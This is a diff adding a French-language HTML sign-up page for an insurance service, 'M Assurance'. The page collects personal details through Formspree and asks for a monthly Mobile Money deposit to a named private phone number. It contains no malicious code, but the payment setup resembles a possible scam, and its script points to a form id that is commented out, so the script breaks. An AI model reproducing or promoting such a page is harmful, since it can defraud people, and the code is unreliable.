@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Inscription | M Assurance</title>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+
+    <div class="container">
+        <div id="registration-card" class="card">
+            <div class="header">
+                <h2>M <span>Assurance</span></h2>
+                <p>Formulaire d'adhésion au service d'assurance</p>
+                <p>apres la validation veuiilez effectuez le depot pour la confirmation </p>
+                <p>montant du depot <mark>5 200F/mois</mark></p>
+                <p>numero depot: 068424624</p>
+                <p>nom: paulvares</p>
+            </div>
+            
+ <!-- <form id="insurance-form" action="https://formspree.io/f/TON_ID_FORMSPREE" method="POST"> -->
+      <form   action="https://formspree.io/f/xdakrrpp"
+  method="POST">
+    <div class="input-group">
+        <label>Nom</label>
+        <input type="text" name="nom" id="nom" placeholder="Votre nom" required>
+    </div>
+    
+    <div class="input-group">
+        <label>Prénom</label>
+        <input type="text" name="prenom" id="prenom" placeholder="Votre prénom" required>
+    </div>
+
+    <div class="input-group">
+        <label>Numéro de téléphone</label>
+        <input type="tel" name="telephone" id="telephone" placeholder="Ex: 06 123 45 67" required>
+    </div>
+
+    <div class="input-group">
+        <label>Ville</label>
+        <input type="text" name="ville" id="ville" placeholder="Ex: Brazzaville" required>
+    </div>
+
+    <button type="submit" class="btn-submit">Valider mon inscription</button>
+</form>
+        </div>
+
+        <div id="success-message" class="card success-card" style="display: none;">
+            <div class="icon-check">✓</div>
+            <h2>Fichier envoyé !</h2>
+            <p class="status-text">En attente du paiement...</p>
+            <div class="payment-info">
+                <p>Veuillez finaliser votre inscription en réglant les frais via <strong>Mobile Money</strong>.</p>
+                <p>Notre service client vous contactera dès réception.</p>
+            </div>
+            <button class="btn-secondary" onclick="window.location.reload()">Retour</button>
+        </div>
+    </div>
+
+</body>
+<style>
+    :root {
+    --primary: #0066ff;
+    --dark: #1a1a1a;
+    --gray: #f4f7f6;
+    --green: #2ecc71;
+}
+
+body {
+    font-family: 'Inter', sans-serif;
+    background-color: var(--gray);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+}
+
+.card {
+    background: white;
+    padding: 40px;
+    border-radius: 20px;
+    box-shadow: 0 15px 35px rgba(0,0,0,0.1);
+    width: 100%;
+    max-width: 400px;
+}
+
+.header { text-align: center; margin-bottom: 30px; }
+.header h2 span { color: var(--primary); }
+
+.input-group { margin-bottom: 20px; }
+.input-group label { display: block; font-weight: 600; margin-bottom: 8px; color: var(--dark); }
+.input-group input {
+    width: 100%;
+    padding: 12px;
+    border: 1px solid #ddd;
+    border-radius: 8px;
+    font-size: 16px;
+    box-sizing: border-box;
+}
+
+.btn-submit {
+    width: 100%;
+    padding: 15px;
+    background: var(--primary);
+    color: white;
+    border: none;
+    border-radius: 8px;
+    font-size: 16px;
+    font-weight: bold;
+    cursor: pointer;
+    transition: 0.3s;
+}
+
+.btn-submit:hover { background: #0052cc; }
+
+/* Styles Message de Succès */
+.success-card { text-align: center; animation: slideUp 0.5s ease-out; }
+.icon-check {
+    width: 70px;
+    height: 70px;
+    background: var(--green);
+    color: white;
+    font-size: 40px;
+    line-height: 70px;
+    border-radius: 50%;
+    margin: 0 auto 20px;
+}
+
+.status-text {
+    font-weight: bold;
+    color: #e67e22;
+    font-size: 18px;
+}
+
+.payment-info {
+    background: #fdf2e9;
+    padding: 15px;
+    border-radius: 10px;
+    margin-top: 20px;
+    font-size: 14px;
+}
+
+.btn-secondary {
+    margin-top: 20px;
+    background: none;
+    border: 1px solid #ddd;
+    padding: 10px 20px;
+    border-radius: 5px;
+    cursor: pointer;
+}
+
+@keyframes slideUp {
+    from { opacity: 0; transform: translateY(20px); }
+    to { opacity: 1; transform: translateY(0); }
+}
+</style>
+<script>
+ const form = document.getElementById('insurance-form');
+
+form.addEventListener('submit', async function(e) {
+    e.preventDefault(); // On bloque le rechargement
+
+    const data = new FormData(form);
+    
+    // Envoi des données à Formspree en arrière-plan
+    const response = await fetch(form.action, {
+        method: 'POST',
+        body: data,
+        headers: { 'Accept': 'application/json' }
+    });
+
+    if (response.ok) {
+        // Si l'envoi a réussi, on affiche ton message de succès
+        document.getElementById('registration-card').style.display = 'none';
+        document.getElementById('success-message').style.display = 'block';
+    } else {
+        alert("Erreur lors de l'envoi. Vérifiez votre connexion.");
+    }
+});
+</script>
+</html>
